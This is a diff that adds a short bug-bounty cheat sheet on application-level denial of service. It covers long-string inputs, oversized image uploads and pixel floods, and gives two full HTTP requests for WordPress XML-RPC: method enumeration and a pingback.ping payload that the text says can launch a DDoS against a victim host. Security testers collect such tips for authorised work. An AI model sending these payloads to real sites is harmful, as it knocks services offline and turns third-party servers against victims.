@@ -1,0 +1,51 @@
+##BugBountyTips ##Application_Level_DoS
+
+  Author : @NovanAR
+  
+1. Long String DoS
+	-Try to input long password when registering an account
+    -Try to input long text in Address, Name, Username, etc.
+
+2. Picture Name Parameter
+    -Upload a picture with large value name parameter
+  	-Upload a picture with the DoS payload inside it
+    -Insert a DoS payload on image's "size" parameter
+  
+3. Pixel Flood Attack
+    -Try to upload a picture with large resolution image
+    
+4. Application Level DoS via XMLRPC
+    1. Find some wordpress website with XMLRPC enabled and call the systems.listMethods
+    	
+        POST /xmlrpc.php HTTP/1.1
+		Host: vulnerable-website.com
+		Accept: /
+		Accept-Language: en
+		Connection: close
+		Content-Length: 93
+
+		<methodCall>
+		<methodName>system.listMethods</methodName>
+		<params></params>
+		</methodCall>
+          
+    2. Use the "pingback" methods to cause a DDOS attack against victim host
+        
+        POST /xmlrpc.php HTTP/1.1
+		Host: vulnerable-website.com
+		Accept: /
+		Accept-Language: en
+		Connection: close
+		Content-Length: 93
+        
+          
+        <methodCall>
+		<methodName>pingback.ping</methodName>
+		<params><param>
+		<value><string>http://yourip:port</string></value>
+		</param><param>
+		<value>
+		<string>https://target.com></string>
+		</value>
+		</param></params>
+		</methodCall>
